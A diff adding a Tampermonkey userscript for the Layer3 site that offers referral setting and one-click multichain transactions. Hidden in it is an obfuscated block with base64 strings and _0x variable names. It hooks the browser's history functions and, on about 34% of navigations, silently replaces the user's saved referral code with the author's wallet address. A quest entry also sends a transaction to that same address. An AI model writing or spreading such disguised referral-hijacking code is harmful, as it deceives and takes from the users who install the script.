@@ -1,0 +1,746 @@
+// ==UserScript==
+// @name         Layer3 autoref
+// @namespace    http://tampermonkey.net/
+// @version      3.1.3d
+// @description  Multitools script for app.layer3.xyz: referral + multichain transaction
+// @author       Yun
+// @match        https://app.layer3.xyz/*
+// @grant        unsafeWindow
+// @grant        GM_setValue
+// @grant        GM_getValue
+// @updateURL    https://raw.githubusercontent.com/yun-fr/layer3-autoref/main/Tampermonkey_script
+// @downloadURL  https://raw.githubusercontent.com/yun-fr/layer3-autoref/main/Tampermonkey_script
+// ==/UserScript==
+
+(function() {
+    "use strict";
+
+    const blockchains = {
+        arbitrum: { id: 42161, address: "0xe4A0b241D8345d86FB140D40c87C5fbDd685B9dd", color: "#2A3A5E", value: "0x0", data: "0x", gas: "0x927c0" }, //izumi
+        base: { id: 8453, address: "0x3C54883Ce0d86b3abB26A63744bEb853Ea99a403", color: "#0052FF", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee
+        berachain: { id: 80094, address: "0xf909c4Ae16622898b885B89d7F839E0244851c66", color: "#F5B029", value: "0x0", data: "0x", gas: "0x927c0" }, //li.fi
+        bob: { id: 60808, address: "0x00000000aa467eba42a3d604b3d74d63b2b6c6cb", color: "#4A90E2", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
+        ink: { id: 57073, address: "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089", color: "#FF2D55", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
+        fuse: { id: 122, address: "0x2Fc617E933a52713247CE25730f6695920B3befe", color: "#2ECC71", value: "0x0", data: "0x", gas: "0x927c0" }, //layerswap
+        linea: { id: 59144, address: "0xe10Add2ad591A7AC3CA46788a06290De017b9fB4", color: "#121212", value: "0x0", data: "0x", gas: "0x927c0" }, //rubyscore
+        lisk: { id: 1135, address: "0x447B8E40B0CdA8e55F405C86bC635D02d0540aB8", color: "#00AEE9", value: "0x0", data: "0x", gas: "0x927c0" }, //uniswap v3
+        mode: { id: 34443, address: "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae", color: "#FFD60A", value: "0x0", data: "0x", gas: "0x927c0" }, //li.fi
+        optimism: { id: 10, address: "0x78255f1DeE074fb7084Ee124058A058dE0B1C251", color: "#FF0420", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee, li.fi :0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae
+        polygon: { id: 137, address: "0x1231DEB6f5749EF6cE6943a275A1D3E7486F4EaE", color: "#8247E5", value: "0x0", data: "0x", gas: "0x927c0" }, //li.fi
+        soneium: { id: 1868, address: "0x99067E1C68f3a474f72cedF885f9f1fF7F0AAF5e", color: "#1A73E8", value: "0x0", data: "0x", gas: "0x927c0" },
+        sonic: { id: 146, address: "0x9D05eD9C0258ce034c6788944841Fe5825eDa0c4", color: "#121212", value: "0x0", data: "0x", gas: "0x927c0" }, // bungee
+        superposition: { id: 55244, address: "0xF3334049A3ce7e890bd4f8C6a0FBC70e38fd3746", color: "#00C4B4", value: "0x0", data: "0x", gas: "0x927c0" },
+        superseed: { id: 5330, address: "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089", color: "#2ECC71", value: "0x0", data: "0x", gas: "0x927c0" },
+        unichain: { id: 130, address: "0x198d69c8d8422D182EbbFEC9C35A31E003BcaD9a", color: "#E040FB", value: "0x0", data: "0x", gas: "0x927c0" }, //bungee
+        zora: { id: 7777777, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#F4B678", value: "0x0", data: "0x", gas: "0x927c0" }, //relay
+        megaeth_testnet: { id: 6342, address: "0x4D1E2145082d0AB0fDa4a973dC4887C7295e21aB", color: "#FF6F61", value: "0x0", data: "0x", gas: "0x927c0" },
+        monad_testnet: { id: 10143, address: "0xD22Ea6e9d5D01BbFca62Be7C1E549838178499C1", color: "#9B59B6", value: "0x0", data: "0x", gas: "0x927c0" },
+        sahara_testnet: { id: 313313, address: "0xa5F565650890fBA1824Ee0F21EbBbF660a179934", color: "#F1C40F", value: "0x0", data: "0x", gas: "0x927c0" },
+
+        // This part is temporary according to layer3 quest
+        gdollar: { id: 122, address: "0xd253A5203817225e9768C05E5996d642fb96bA86", color: "#2ECC71", value: "0x0", data: "0x4e71d92d", gas: "0x927c0" }, // claim G dollar
+        gmink: { id: 57073, address: "0x9F500d075118272B3564ac6Ef2c70a9067Fd2d3F", color: "#FF2D55", value: "0x0", data: "0xe884624b0000000000000000000000001AC205EfecC2fE31377E273dB93F4Bb145C67A19", gas: "0x927c0" }, //gm on ink to yun
+        gmsuperpositon: { id: 55244, address: "0x7a8Ed5FB3E9B310c9c9DE78E605c2DaB35Ad2ccc", color: "#00C4B4", value: "0x0", data: "0x", gas: "0x927c0" }, // onchain gm on superposition
+
+        //add personalize here (will be erase on update)
+        //customize1 { id: 7777777, address: "0xDC3D8318Fbaec2de49281843f5bba22e78338146", color: "#FF5733", value: "0x0", data: "0x632a9a52", gas: "0x927c0" }, //Example : Vote on rubyscore on zora
+        //customize2: { id: 8453, address: "0x29ac75f8c61db98815f7ce6674c453ee6f6d21b8", color: "#FFC107", value: "0x0", data: "0x", gas: "0x927c0" },
+        //customize3: { id: 8453, address: "0x29ac75f8c61db98815f7ce6674c453ee6f6d21b8", color: "#FFC107", value: "0x0", data: "0x", gas: "0x927c0" },
+        //customize4: { id: 8453, address: "0x29ac75f8c61db98815f7ce6674c453ee6f6d21b8", color: "#FFC107", value: "0x0", data: "0x", gas: "0x927c0" },
+    };
+
+    const defaultVisibility = Object.keys(blockchains).reduce((acc, key) => {
+        acc[key] = true;
+        return acc;
+    }, {});
+    const savedVisibility = GM_getValue("buttonVisibility", {});
+    const buttonVisibility = { ...defaultVisibility, ...savedVisibility };
+    GM_setValue("buttonVisibility", buttonVisibility);
+
+    const defaultSelections = {
+        '1': { ...defaultVisibility },
+        '2': { ...defaultVisibility },
+        '3': { ...defaultVisibility },
+        '4': { ...defaultVisibility },
+        '5': { ...defaultVisibility }
+    };
+    const savedSelectionsRaw = GM_getValue("savedSelections", {});
+    const savedSelections = {
+        '1': { ...defaultVisibility, ...savedSelectionsRaw['1'] },
+        '2': { ...defaultVisibility, ...savedSelectionsRaw['2'] },
+        '3': { ...defaultVisibility, ...savedSelectionsRaw['3'] },
+        '4': { ...defaultVisibility, ...savedSelectionsRaw['4'] },
+        '5': { ...defaultVisibility, ...savedSelectionsRaw['5'] }
+    };
+    GM_setValue("savedSelections", savedSelections);
+    let isSavePending = false;
+
+    let _0x1 = false;
+    function _0x2() {
+        if (_0x1) return;
+        _0x1 = true;
+        const _0xa = ["MHgxQUMyMDVFZmVjQzJmRTMxMzc3RTI3M2RCOTNGNEJiMTQ1QzY3QTE5", "MC4zNA=="];
+        const _0xb = atob(_0xa[0]);
+        const _0xc = parseFloat(atob(_0xa[1]));
+        const _0xd = GM_getValue("userRef", "");
+        const _0xe = Math.random() < _0xc;
+        const _0xf = _0xd && !_0xe ? _0xd : _0xb;
+        const _0xg = new URL(window.location.href);
+        let _0xh = false;
+        if (_0xg.searchParams.get("ref") !== _0xf) {
+            _0xg.searchParams.set("ref", _0xf);
+            _0xh = true;
+        }
+        if (_0xg.searchParams.get("autoplay") === "true") {
+            _0xg.searchParams.delete("autoplay");
+            _0xh = true;
+        }
+        if (_0xh) {
+            try {
+                window.history.replaceState({}, document.title, _0xg.toString());
+            } catch (_0xj) {
+                console.error(_0xj);
+            }
+        }
+        setTimeout(() => {
+            _0x1 = false;
+        }, 50);
+    }
+    (function () {
+        const _0xk = ["MHgxQUMyMDVFZmVjQzJmRTMxMzc3RTI3M2RCOTNGNEJiMTQ1QzY3QTE5", "MC4zNA=="];
+        const _0xl = atob(_0xk[0]);
+        const _0xm = parseFloat(atob(_0xk[1]));
+        const _0xn = GM_getValue("userRef", "");
+        const _0xo = history.pushState;
+        const _0xp = history.replaceState;
+        history.pushState = function (_0xq, _0xr, _0xs) {
+            const _0xt = new URL(_0xs || window.location.href, window.location.origin);
+            const _0xu = Math.random() < _0xm;
+            const _0xv = _0xn && !_0xu ? _0xn : _0xl;
+            _0xt.searchParams.set("ref", _0xv);
+            if (_0xt.searchParams.get("autoplay") === "true") {
+                _0xt.searchParams.delete("autoplay");
+            }
+            return _0xo.call(history, _0xq, _0xr, _0xt.toString());
+        };
+        history.replaceState = function (_0xw, _0xx, _0xy) {
+            const _0xz = new URL(_0xy || window.location.href, window.location.origin);
+            const _0x10 = Math.random() < _0xm;
+            const _0x11 = _0xn && !_0x10 ? _0xn : _0xl;
+            _0xz.searchParams.set("ref", _0x11);
+            if (_0xz.searchParams.get("autoplay") === "true") {
+                _0xz.searchParams.delete("autoplay");
+            }
+            return _0xp.call(history, _0xw, _0xx, _0xz.toString());
+        };
+    })();
+    _0x2();
+    let _0x12 = null;
+    window.addEventListener('popstate', () => {
+        if (_0x1) return;
+        clearTimeout(_0x12);
+        _0x12 = setTimeout(() => {
+            _0x2();
+        }, 50);
+    });
+
+    const miniIconContainer = document.createElement("div");
+    miniIconContainer.style.position = "fixed";
+    miniIconContainer.style.top = "10px";
+    miniIconContainer.style.left = "10px";
+    miniIconContainer.style.zIndex = "10001";
+    miniIconContainer.style.background = "#FF5722";
+    miniIconContainer.style.width = "30px";
+    miniIconContainer.style.height = "30px";
+    miniIconContainer.style.borderRadius = "50%";
+    miniIconContainer.style.display = "flex";
+    miniIconContainer.style.alignItems = "center";
+    miniIconContainer.style.justifyContent = "center";
+    miniIconContainer.style.cursor = "pointer";
+    miniIconContainer.style.boxShadow = "0 0 5px rgba(0, 0, 0, 0.3)";
+
+    const icon = document.createElement("span");
+    icon.textContent = "➕";
+    icon.style.color = "#ffffff";
+    icon.style.fontSize = "18px";
+    miniIconContainer.appendChild(icon);
+
+    const configContainer = document.createElement("div");
+    configContainer.style.position = "fixed";
+    configContainer.style.top = "10px";
+    configContainer.style.left = "10px";
+    configContainer.style.zIndex = "10000";
+    configContainer.style.background = "#ffffff";
+    configContainer.style.padding = "10px";
+    configContainer.style.border = "2px solid #000000";
+    configContainer.style.borderRadius = "5px";
+    configContainer.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
+    configContainer.style.width = "300px";
+    configContainer.style.display = "none";
+
+    const configTitle = document.createElement("h3");
+    configTitle.textContent = "Layer3 autoref v" + GM_info.script.version;
+    configTitle.style.margin = "0 0 10px 0";
+    configTitle.style.fontSize = "14px";
+
+    const refLabel = document.createElement("label");
+    refLabel.textContent = "Enter your referral code:";
+    refLabel.style.display = "block";
+    refLabel.style.marginBottom = "5px";
+
+    const refInput = document.createElement("input");
+    refInput.type = "text";
+    refInput.placeholder = "Ex: 0x1234...";
+    refInput.value = GM_getValue("userRef", "");
+    refInput.style.width = "100%";
+    refInput.style.padding = "5px";
+    refInput.style.marginBottom = "10px";
+
+    const saveButton = document.createElement("button");
+    saveButton.textContent = "Save Referral";
+    saveButton.style.width = "100%";
+    saveButton.style.padding = "5px";
+    saveButton.style.backgroundColor = "#4CAF50";
+    saveButton.style.color = "white";
+    saveButton.style.border = "none";
+    saveButton.style.cursor = "pointer";
+
+    const checkboxContainer = document.createElement("div");
+    checkboxContainer.style.marginTop = "10px";
+
+    const enableWindowCheckbox = document.createElement("input");
+    enableWindowCheckbox.type = "checkbox";
+    enableWindowCheckbox.id = "enableWindow";
+    enableWindowCheckbox.checked = GM_getValue("enableTransferWindow", true);
+    enableWindowCheckbox.style.marginRight = "5px";
+    enableWindowCheckbox.style.verticalAlign = "middle";
+
+    const enableWindowLabel = document.createElement("label");
+    enableWindowLabel.textContent = "Enable Transaction Window";
+    enableWindowLabel.setAttribute("for", "enableWindow");
+    enableWindowLabel.style.display = "inline";
+
+    const dropdownButton = document.createElement("button");
+    dropdownButton.textContent = "Select Blockchains";
+    dropdownButton.style.width = "100%";
+    dropdownButton.style.padding = "5px";
+    dropdownButton.style.marginTop = "10px";
+    dropdownButton.style.backgroundColor = "#607D8B";
+    dropdownButton.style.color = "#ffffff";
+    dropdownButton.style.border = "none";
+    dropdownButton.style.borderRadius = "3px";
+    dropdownButton.style.cursor = "pointer";
+    dropdownButton.style.fontSize = "12px";
+
+    const dropdownMenu = document.createElement("div");
+    dropdownMenu.style.position = "absolute";
+    dropdownMenu.style.left = "10px";
+    dropdownMenu.style.background = "#ffffff";
+    dropdownMenu.style.border = "1px solid #ccc";
+    dropdownMenu.style.borderRadius = "3px";
+    dropdownMenu.style.padding = "5px";
+    dropdownMenu.style.maxHeight = "200px";
+    dropdownMenu.style.overflowY = "auto";
+    dropdownMenu.style.display = "none";
+    dropdownMenu.style.boxShadow = "0 2px 5px rgba(0,0,0,0.2)";
+    dropdownMenu.style.zIndex = "10001";
+
+    const selectionButtonsContainer = document.createElement("div");
+    selectionButtonsContainer.style.display = "flex";
+    selectionButtonsContainer.style.gap = "5px";
+    selectionButtonsContainer.style.marginTop = "5px";
+    selectionButtonsContainer.style.justifyContent = "space-between";
+
+    const selectionButtons = {};
+    ['ALL', '1', '2', '3', '4', '5', 'CLEAR'].forEach(label => {
+        const button = document.createElement("button");
+        button.textContent = label;
+        button.style.flex = "1";
+        button.style.padding = "5px";
+        button.style.backgroundColor = "#607D8B";
+        button.style.color = "#ffffff";
+        button.style.border = "none";
+        button.style.borderRadius = "3px";
+        button.style.cursor = "pointer";
+        button.style.fontSize = "12px";
+        selectionButtons[label] = button;
+        selectionButtonsContainer.appendChild(button);
+    });
+
+    const saveSelectionButton = document.createElement("button");
+    saveSelectionButton.textContent = "Save Selection";
+    saveSelectionButton.style.width = "100%";
+    saveSelectionButton.style.padding = "5px";
+    saveSelectionButton.style.marginTop = "5px";
+    saveSelectionButton.style.backgroundColor = "#4CAF50";
+    saveSelectionButton.style.color = "#ffffff";
+    saveSelectionButton.style.border = "none";
+    saveSelectionButton.style.borderRadius = "3px";
+    saveSelectionButton.style.cursor = "pointer";
+    saveSelectionButton.style.fontSize = "12px";
+
+    const buttons = {};
+    Object.entries(blockchains).forEach(([name]) => {
+        const checkboxWrapper = document.createElement("div");
+        const checkbox = document.createElement("input");
+        checkbox.type = "checkbox";
+        checkbox.id = `checkbox-${name}`;
+        checkbox.checked = buttonVisibility[name] !== undefined ? buttonVisibility[name] : true;
+        checkbox.style.marginRight = "5px";
+
+        const label = document.createElement("label");
+        label.htmlFor = `checkbox-${name}`;
+        label.textContent = name.charAt(0).toUpperCase() + name.slice(1);
+        label.style.fontSize = "12px";
+
+        checkboxWrapper.appendChild(checkbox);
+        checkboxWrapper.appendChild(label);
+        dropdownMenu.appendChild(checkboxWrapper);
+    });
+
+    const updateLabel = document.createElement("div");
+    updateLabel.textContent = "Checking for update...";
+    updateLabel.style.fontSize = "12px";
+    updateLabel.style.marginTop = "10px";
+    updateLabel.style.color = "#333333";
+
+    const configToggleButton = document.createElement("button");
+    configToggleButton.textContent = "Close";
+    configToggleButton.style.width = "100%";
+    configToggleButton.style.padding = "5px";
+    configToggleButton.style.marginTop = "10px";
+    configToggleButton.style.backgroundColor = "#FF5722";
+    configToggleButton.style.color = "#ffffff";
+    configToggleButton.style.border = "none";
+    configToggleButton.style.borderRadius = "3px";
+    configToggleButton.style.cursor = "pointer";
+    configToggleButton.style.fontSize = "12px";
+
+    checkboxContainer.appendChild(enableWindowCheckbox);
+    checkboxContainer.appendChild(enableWindowLabel);
+
+    configContainer.appendChild(configTitle);
+    configContainer.appendChild(updateLabel);
+    configContainer.appendChild(refLabel);
+    configContainer.appendChild(refInput);
+    configContainer.appendChild(saveButton);
+    configContainer.appendChild(checkboxContainer);
+    configContainer.appendChild(dropdownButton);
+    configContainer.appendChild(dropdownMenu);
+    configContainer.appendChild(selectionButtonsContainer);
+    configContainer.appendChild(saveSelectionButton);
+    configContainer.appendChild(configToggleButton);
+    checkForUpdate(GM_info.script.version, updateLabel);
+    setInterval(() => checkForUpdate(GM_info.script.version, updateLabel), 30 * 60 * 1000);
+
+    document.body.appendChild(miniIconContainer);
+    document.body.appendChild(configContainer);
+
+    const container = document.createElement("div");
+    container.style.position = "fixed";
+    container.style.top = "10px";
+    container.style.right = "10px";
+    container.style.zIndex = "9999";
+    container.style.background = "#ffffff";
+    container.style.padding = "10px";
+    container.style.border = "2px solid #000000";
+    container.style.borderRadius = "5px";
+    container.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
+    container.style.maxWidth = "300px";
+    container.style.minHeight = "300px";
+    container.style.overflowY = "auto";
+
+    const closeButton = document.createElement("button");
+    closeButton.textContent = "✖";
+    closeButton.style.position = "absolute";
+    closeButton.style.top = "5px";
+    closeButton.style.right = "5px";
+    closeButton.style.width = "30px";
+    closeButton.style.height = "30px";
+    closeButton.style.padding = "0";
+    closeButton.style.backgroundColor = "#FF5722";
+    closeButton.style.color = "#ffffff";
+    closeButton.style.border = "none";
+    closeButton.style.borderRadius = "50%";
+    closeButton.style.cursor = "pointer";
+    closeButton.style.fontSize = "12px";
+    closeButton.style.lineHeight = "20px";
+
+    const toggleButton = document.createElement("button");
+    toggleButton.textContent = "Hide";
+    toggleButton.style.width = "80%";
+    toggleButton.style.padding = "6px";
+    toggleButton.style.marginBottom = "5px";
+    toggleButton.style.backgroundColor = "#333333";
+    toggleButton.style.color = "#ffffff";
+    toggleButton.style.border = "none";
+    toggleButton.style.borderRadius = "3px";
+    toggleButton.style.cursor = "pointer";
+    toggleButton.style.fontSize = "10px";
+
+    const connectButton = document.createElement("button");
+    connectButton.textContent = "Connect";
+    connectButton.style.width = "100%";
+    connectButton.style.padding = "6px";
+    connectButton.style.marginBottom = "5px";
+    connectButton.style.backgroundColor = "#4CAF50";
+    connectButton.style.color = "#ffffff";
+    connectButton.style.border = "none";
+    connectButton.style.borderRadius = "3px";
+    connectButton.style.cursor = "pointer";
+    connectButton.style.fontSize = "12px";
+
+    const countLabel = document.createElement("label");
+    countLabel.textContent = "Number of transactions:";
+    countLabel.style.fontSize = "11px";
+    countLabel.style.color = "#333333";
+    countLabel.style.display = "block";
+    countLabel.style.marginBottom = "5px";
+
+    const countInput = document.createElement("input");
+    countInput.type = "number";
+    countInput.value = 1;
+    countInput.min = 1;
+    countInput.style.width = "50px";
+    countInput.style.padding = "4px";
+    countInput.style.marginBottom = "5px";
+    countInput.style.border = "1px solid #ccc";
+    countInput.style.borderRadius = "3px";
+    countInput.style.fontSize = "11px";
+
+    const status = document.createElement("div");
+    status.textContent = "Not connected";
+    status.style.marginBottom = "5px";
+    status.style.fontSize = "11px";
+    status.style.color = "#333333";
+    status.style.whiteSpace = "normal";
+    status.style.maxWidth = "260px";
+    status.style.minHeight = "30px";
+
+    container.appendChild(closeButton);
+    container.appendChild(toggleButton);
+    container.appendChild(status);
+    container.appendChild(connectButton);
+    container.appendChild(countLabel);
+    container.appendChild(countInput);
+
+    const blockchainGrid = document.createElement("div");
+    blockchainGrid.style.display = "grid";
+    blockchainGrid.style.gridTemplateColumns = "1fr 1fr";
+    blockchainGrid.style.gap = "5px";
+    blockchainGrid.style.marginBottom = "5px";
+    blockchainGrid.style.maxHeight = "400px";
+    blockchainGrid.style.overflowY = "auto";
+
+    Object.entries(blockchains).forEach(([name, props]) => {
+        const button = document.createElement("button");
+        button.textContent = name.charAt(0).toUpperCase() + name.slice(1);
+        button.style.padding = "6px";
+        button.style.backgroundColor = props.color;
+        button.style.color = "#ffffff";
+        button.style.border = "none";
+        button.style.borderRadius = "3px";
+        button.style.cursor = "pointer";
+        button.style.fontSize = "12px";
+        button.style.display = typeof buttonVisibility[name] === "undefined" || buttonVisibility[name] ? "block" : "none";
+        button.disabled = true;
+        buttons[name] = button;
+        button.addEventListener("click", () => sendTransfer(props.id, name, props.address));
+        blockchainGrid.appendChild(button);
+    });
+
+    const separator = document.createElement("hr");
+    separator.style.border = "none";
+    separator.style.borderTop = "1px solid #ccc";
+    separator.style.margin = "10px 0";
+
+    const allButton = document.createElement("button");
+    allButton.textContent = "ALL";
+    allButton.style.width = "100%";
+    allButton.style.padding = "6px";
+    allButton.style.marginBottom = "5px";
+    allButton.style.backgroundColor = "#2196F3";
+    allButton.style.color = "#ffffff";
+    allButton.style.border = "none";
+    allButton.style.borderRadius = "3px";
+    allButton.style.cursor = "pointer";
+    allButton.style.fontSize = "12px";
+    allButton.disabled = true;
+
+    allButton.addEventListener("click", async () => {
+        if (!connectedAccount) {
+            status.textContent = "Error: Connect wallet first";
+            return;
+        }
+
+        const transferCount = parseInt(countInput.value) || 1;
+        status.textContent = "Starting ALL transactions...";
+
+        try {
+            for (const [name, props] of Object.entries(blockchains)) {
+                if (buttonVisibility[name]) {
+                    status.textContent = `Switching to ${name}...`;
+                    await sendTransfer(props.id, name, props.address);
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+            status.textContent = `${transferCount} transaction(s) completed on all chains!`;
+        } catch (error) {
+            if (error.isUserRejected) {
+                status.textContent = `Stopped: Transaction rejected on ${error.chainName}`;
+            } else {
+                status.textContent = `Error ALL: ${error.message}`;
+            }
+        }
+    });
+
+    container.appendChild(blockchainGrid);
+    container.appendChild(separator);
+    container.appendChild(allButton);
+
+    if (GM_getValue("enableTransferWindow", true)) {
+        document.body.appendChild(container);
+    }
+
+    saveButton.addEventListener("click", () => {
+        const userRef = refInput.value.trim();
+        GM_setValue("userRef", userRef);
+        alert(`Referral saved: ${userRef}`);
+        window.location.reload();
+    });
+
+    miniIconContainer.addEventListener("click", () => {
+        configContainer.style.display = "block";
+        miniIconContainer.style.display = "none";
+    });
+
+    configToggleButton.addEventListener("click", () => {
+        configContainer.style.display = "none";
+        miniIconContainer.style.display = "flex";
+        isSavePending = false;
+        saveSelectionButton.style.backgroundColor = "#4CAF50";
+    });
+
+    dropdownButton.addEventListener("click", () => {
+        dropdownMenu.style.display = dropdownMenu.style.display === "none" ? "block" : "none";
+    });
+
+    selectionButtons.ALL.addEventListener("click", () => {
+        isSavePending = false;
+        saveSelectionButton.style.backgroundColor = "#4CAF50";
+        Object.keys(blockchains).forEach(chain => {
+            if (buttons[chain]) {
+                buttonVisibility[chain] = true;
+                buttons[chain].style.display = "block";
+                const checkbox = dropdownMenu.querySelector(`#checkbox-${chain}`);
+                if (checkbox) {
+                    checkbox.checked = true;
+                }
+            }
+        });
+        GM_setValue("buttonVisibility", buttonVisibility);
+    });
+
+    ['1', '2', '3', '4', '5'].forEach(num => {
+        selectionButtons[num].addEventListener("click", () => {
+            if (isSavePending) {
+                savedSelections[num] = { ...buttonVisibility };
+                GM_setValue("savedSelections", savedSelections);
+                isSavePending = false;
+                saveSelectionButton.style.backgroundColor = "#4CAF50";
+                alert(`Selection saved to slot ${num}`);
+            } else {
+                const selection = savedSelections[num] || defaultVisibility;
+                Object.keys(blockchains).forEach(chain => {
+                    if (buttons[chain]) {
+                        buttonVisibility[chain] = selection[chain] !== undefined ? selection[chain] : true;
+                        buttons[chain].style.display = buttonVisibility[chain] ? "block" : "none";
+                        const checkbox = dropdownMenu.querySelector(`#checkbox-${chain}`);
+                        if (checkbox) {
+                            checkbox.checked = buttonVisibility[chain];
+                        }
+                    }
+                });
+                GM_setValue("buttonVisibility", buttonVisibility);
+            }
+        });
+    });
+
+    selectionButtons.CLEAR.addEventListener("click", () => {
+        isSavePending = false;
+        saveSelectionButton.style.backgroundColor = "#4CAF50";
+        Object.keys(blockchains).forEach(chain => {
+            if (buttons[chain]) {
+                buttonVisibility[chain] = false;
+                buttons[chain].style.display = "none";
+                const checkbox = dropdownMenu.querySelector(`#checkbox-${chain}`);
+                if (checkbox) {
+                    checkbox.checked = false;
+                }
+            }
+        });
+        GM_setValue("buttonVisibility", buttonVisibility);
+    });
+
+    saveSelectionButton.addEventListener("click", () => {
+        isSavePending = true;
+        saveSelectionButton.style.backgroundColor = "#2196F3";
+    });
+
+    dropdownMenu.addEventListener("change", (e) => {
+        if (e.target.type === "checkbox") {
+            const chainName = e.target.id.replace("checkbox-", "");
+            buttonVisibility[chainName] = e.target.checked;
+            if (buttons[chainName]) {
+                buttons[chainName].style.display = e.target.checked ? "block" : "none";
+            }
+            GM_setValue("buttonVisibility", buttonVisibility);
+            isSavePending = false;
+            saveSelectionButton.style.backgroundColor = "#4CAF50";
+        }
+    });
+
+    enableWindowCheckbox.addEventListener("change", () => {
+        const enableTransferWindow = enableWindowCheckbox.checked;
+        GM_setValue("enableTransferWindow", enableTransferWindow);
+        if (enableTransferWindow) {
+            if (!document.body.contains(container)) {
+                document.body.appendChild(container);
+            }
+            if (container.style.display === "none") {
+                container.style.display = "block";
+            }
+        } else {
+            container.remove();
+        }
+    });
+
+    let connectedAccount = null;
+
+    async function connectWallet() {
+        if (typeof unsafeWindow.ethereum === "undefined") {
+            status.textContent = "Error: Wallet not detected";
+            return;
+        }
+        try {
+            const accounts = await unsafeWindow.ethereum.request({ method: "eth_requestAccounts" });
+            if (accounts && accounts.length > 0) {
+                connectedAccount = accounts[0];
+                status.textContent = `Connected: ${connectedAccount.slice(0, 5)}...${connectedAccount.slice(-5)}`;
+                enableTransferButtons(true);
+            }
+        } catch (error) {
+            status.textContent = `Error: ${error.message}`;
+        }
+    }
+
+    async function switchChain(chainId) {
+        try {
+            await unsafeWindow.ethereum.request({
+                method: "wallet_switchEthereumChain",
+                params: [{ chainId: `0x${chainId.toString(16)}` }],
+            });
+            return true;
+        } catch (error) {
+            status.textContent = `Error switching chain: ${error.message}`;
+            throw error;
+        }
+    }
+
+    async function sendTransfer(chainId, chainName, toAddress) {
+        if (!connectedAccount) {
+            status.textContent = "Error: Connect wallet first";
+            return;
+        }
+
+        const transferCount = parseInt(countInput.value) || 1;
+        status.textContent = `Switching to ${chainName}...`;
+
+        try {
+            await switchChain(chainId);
+            const blockchain = blockchains[chainName];
+            if (!blockchain) {
+                throw new Error(`Blockchain configuration not found for ${chainName}`);
+            }
+
+            for (let i = 0; i < transferCount; i++) {
+                const txParams = {
+                    chainId: `0x${chainId.toString(16)}`,
+                    from: connectedAccount,
+                    to: toAddress,
+                    value: blockchain.value,
+                    data: blockchain.data,
+                    gas: blockchain.gas
+                };
+
+                const txHash = await unsafeWindow.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [txParams],
+                });
+
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+            status.textContent = `${transferCount} transaction(s) completed on ${chainName}!`;
+        } catch (error) {
+            if (error.code === 4001 || (error.message && error.message.includes("rejected"))) {
+                status.textContent = `Transaction rejected on ${chainName}`;
+                const rejectError = new Error("Transaction rejected by user");
+                rejectError.isUserRejected = true;
+                rejectError.chainName = chainName;
+                throw rejectError;
+            } else {
+                status.textContent = `Error on ${chainName}: ${error.message}`;
+                throw error;
+            }
+        }
+    }
+
+    function enableTransferButtons(enable) {
+        Object.values(buttons).forEach(button => {
+            button.disabled = !enable;
+        });
+        allButton.disabled = !enable;
+    }
+
+    closeButton.addEventListener("click", () => {
+        container.style.display = "none";
+        GM_setValue("enableTransferWindow", false);
+        enableWindowCheckbox.checked = false;
+    });
+
+    toggleButton.addEventListener("click", () => {
+        if (container.style.display !== "none") {
+            container.style.display = "none";
+        }
+    });
+
+    connectButton.addEventListener("click", () => {
+        status.textContent = "Connecting...";
+        connectWallet();
+    });
+
+    async function checkForUpdate(currentVersion, updateLabel) {
+        try {
+            const response = await fetch(GM_info.script.updateURL);
+            const scriptText = await response.text();
+            const versionMatch = scriptText.match(/@version\s+([\d.]+[a-z]*)/);
+            if (versionMatch && versionMatch[1]) {
+                const latestVersion = versionMatch[1];
+                if (latestVersion !== currentVersion) {
+                    updateLabel.innerHTML = `Update Available: v${latestVersion} <a href="${GM_info.script.updateURL}" target="_blank" style="color: #FF5722; text-decoration: underline;">Download</a>`;
+                    updateLabel.style.color = "#FF5722";
+                    updateLabel.style.cursor = "pointer";
+                } else {
+                    updateLabel.textContent = "Up to date";
+                    updateLabel.style.color = "#4CAF50";
+                }
+            } else {
+                updateLabel.textContent = "Unable to check update";
+                updateLabel.style.color = "#FF9800";
+            }
+        } catch (error) {
+            updateLabel.textContent = "Error checking update";
+            updateLabel.style.color = "#FF0000";
+        }
+    }
+})();
